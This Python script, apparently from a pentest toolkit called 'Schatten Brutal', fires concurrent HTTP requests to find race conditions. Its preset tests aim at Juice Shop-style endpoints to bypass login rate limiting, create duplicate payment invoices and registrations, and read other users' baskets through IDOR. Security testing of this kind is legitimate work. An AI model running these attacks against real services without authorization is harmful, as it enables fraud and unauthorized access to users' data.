#!/usr/bin/env python3
"""
Race Test — Concurrent request launcher for Schatten Brutal.
Tests race conditions on auth, payment, registration, and CRUD endpoints.

Usage:
    python3 race-test.py <target_url> [options]

Options:
    --endpoint PATH      API path to test (default: /api/payment?action=create)
    --method HTTP        Method (default: POST)
    --data JSON          Request body template
    --concurrent N       Concurrent requests (default: 10)
    --auth HEADER        Auth header value
    --test TYPE          Test type: login, payment, register, custom (default: custom)
    --output FILE        Save results
"""

import sys
import json
import time
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

try:
    import requests
except ImportError:
    print("pip install requests"); sys.exit(1)


def send_request(url: str, method: str, headers: dict, data: dict = None, idx: int = 0) -> dict:
    """Send a single request and record timing."""
    start = time.time()
    try:
        if method.upper() == "GET":
            r = requests.get(url, headers=headers, params=data, timeout=15, allow_redirects=False)
        elif method.upper() == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=15, allow_redirects=False)
        elif method.upper() == "PUT":
            r = requests.put(url, headers=headers, json=data, timeout=15, allow_redirects=False)
        elif method.upper() == "PATCH":
            r = requests.patch(url, headers=headers, json=data, timeout=15, allow_redirects=False)
        elif method.upper() == "DELETE":
            r = requests.delete(url, headers=headers, timeout=15, allow_redirects=False)
        else:
            r = requests.request(method, url, headers=headers, json=data, timeout=15, allow_redirects=False)

        elapsed = time.time() - start
        return {
            "idx": idx,
            "status": r.status_code,
            "length": len(r.text),
            "time": round(elapsed, 4),
            "body_preview": r.text[:200],
            "headers": dict(r.headers),
        }
    except requests.Timeout:
        return {"idx": idx, "status": "TIMEOUT", "time": round(time.time() - start, 4)}
    except requests.RequestException as e:
        return {"idx": idx, "status": "ERROR", "error": str(e), "time": round(time.time() - start, 4)}


def race_attack(url: str, method: str, headers: dict, data: dict,
                concurrent: int, label: str = "") -> list[dict]:
    """Fire concurrent requests and analyze results."""
    print(f"\n[*] Race test: {label}")
    print(f"    URL: {url}")
    print(f"    Method: {method} | Concurrent: {concurrent}")

    results = []
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=concurrent) as pool:
        futures = {pool.submit(send_request, url, method, headers, data, i): i for i in range(concurrent)}
        for future in as_completed(futures):
            result = future.result()
            results.append(result)

    total_time = round(time.time() - start_time, 3)
    results.sort(key=lambda x: x.get("idx", 0))

    # Analyze
    statuses = {}
    for r in results:
        s = str(r.get("status", "error"))
        statuses[s] = statuses.get(s, 0) + 1

    unique_bodies = len(set(r.get("body_preview", "") for r in results if r.get("body_preview")))
    timing_variance = max(r.get("time", 0) for r in results) - min(r.get("time", 0) for r in results) if results else 0

    print(f"    Total time: {total_time}s")
    print(f"    Status distribution: {statuses}")
    print(f"    Unique responses: {unique_bodies}")
    print(f"    Timing variance: {round(timing_variance, 3)}s")

    # Detect race condition
    success_count = statuses.get("200", 0) + statuses.get("201", 0)
    if success_count > 1:
        print(f"    [!!!] RACE CONDITION: {success_count} requests succeeded simultaneously!")
    elif unique_bodies > 1:
        print(f"    [!] Non-deterministic: {unique_bodies} different responses")
    else:
        print(f"    [-] No race condition detected")

    return results


def test_login_race(base_url: str, headers: dict, concurrent: int) -> list[dict]:
    """Race condition on login — try to bypass rate limiting."""
    print("=" * 60)
    print("[*] LOGIN RACE — attempt to bypass rate limiting")
    url = f"{base_url}/rest/user/login"
    data = {"email": "admin@juice-sh.op", "password": "wrong_password"}
    return race_attack(url, "POST", headers, data, concurrent, "login-race")


def test_payment_race(base_url: str, headers: dict, concurrent: int) -> list[dict]:
    """Race condition on payment — try to create duplicate invoices."""
    print("=" * 60)
    print("[*] PAYMENT RACE — attempt duplicate invoice creation")
    url = f"{base_url}/api/payment?action=create"
    data = {"planType": "pro", "amount": 49000}
    return race_attack(url, "POST", headers, data, concurrent, "payment-race")


def test_register_race(base_url: str, headers: dict, concurrent: int) -> list[dict]:
    """Race condition on registration — try duplicate accounts."""
    print("=" * 60)
    print("[*] REGISTER RACE — attempt duplicate registration")
    url = f"{base_url}/api/Users"
    ts = int(time.time())
    data = {"email": f"race_test_{ts}@evil.com", "password": "TestPass123!", "name": "RaceTest"}
    return race_attack(url, "POST", headers, data, concurrent, "register-race")


def test_idor_race(base_url: str, headers: dict, concurrent: int) -> list[dict]:
    """Race condition on resource access — IDOR timing."""
    print("=" * 60)
    print("[*] IDOR RACE — concurrent basket access")
    results = []
    for basket_id in range(1, concurrent + 1):
        url = f"{base_url}/rest/basket/{basket_id}"
        results.extend([race_attack(url, "GET", headers, None, 1, f"basket-{basket_id}")])
    return [item for sublist in results for item in sublist]


def main():
    parser = argparse.ArgumentParser(description="Race Test — Schatten Brutal")
    parser.add_argument("target", help="Target base URL (e.g., http://localhost:3000)")
    parser.add_argument("--endpoint", help="Custom endpoint path")
    parser.add_argument("--method", default="POST", help="HTTP method")
    parser.add_argument("--data", help="JSON request body")
    parser.add_argument("--concurrent", type=int, default=10, help="Concurrent requests")
    parser.add_argument("--auth", help="Auth header: 'Authorization: Bearer xxx'")
    parser.add_argument("--test", choices=["login", "payment", "register", "idor", "custom", "all"], default="all")
    parser.add_argument("--output", help="Output file")
    args = parser.parse_args()

    headers = {"Content-Type": "application/json"}
    if args.auth:
        parts = args.auth.split(":", 1)
        headers[parts[0].strip()] = parts[1].strip()

    target = args.target.rstrip("/")
    all_results = {}

    if args.test in ("login", "all"):
        all_results["login"] = test_login_race(target, headers, args.concurrent)

    if args.test in ("payment", "all"):
        all_results["payment"] = test_payment_race(target, headers, args.concurrent)

    if args.test in ("register", "all"):
        all_results["register"] = test_register_race(target, headers, args.concurrent)

    if args.test in ("idor", "all"):
        all_results["idor"] = test_idor_race(target, headers, min(args.concurrent, 5))

    if args.test == "custom" and args.endpoint:
        url = f"{target}{args.endpoint}"
        data = json.loads(args.data) if args.data else None
        all_results["custom"] = race_attack(url, args.method, headers, data, args.concurrent, "custom")

    # Summary
    print("\n" + "=" * 60)
    print("[*] RACE TEST SUMMARY")
    total_success = 0
    for test_name, results in all_results.items():
        success = sum(1 for r in results if r.get("status") in (200, 201))
        total_success += success
        print(f"  {test_name}: {success}/{len(results)} succeeded")
    if total_success > len(all_results):
        print(f"\n[!!!] {total_success} total successes across {len(all_results)} tests — race condition likely!")

    if args.output:
        out_path = Path(args.output)
        if out_path.is_dir() or not out_path.suffix:
            out_path = out_path / "05_race.json"
        out_path.write_text(json.dumps(all_results, indent=2, default=str))
        print(f"\n[+] Results saved to {out_path}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
